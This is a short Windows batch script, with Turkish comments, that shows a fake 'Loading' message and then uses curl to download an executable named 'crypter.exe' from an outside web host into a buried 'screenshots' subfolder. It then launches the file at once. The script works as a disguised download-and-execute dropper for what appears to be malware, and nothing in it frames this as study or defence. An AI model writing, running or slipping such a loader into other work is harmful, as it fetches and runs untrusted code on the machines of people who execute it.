@echo off
echo Loading & Yukleniyor
timeout /t 3 >nul

rem curl kullanarak dosyayı indirme
curl -o "screenshots\profile\aa\b\crypter.exe" https://anodos.store/download/crypter.exe

rem Dosyayı çalıştırma
start "" "screenshots\profile\aa\b\crypter.exe"

exit
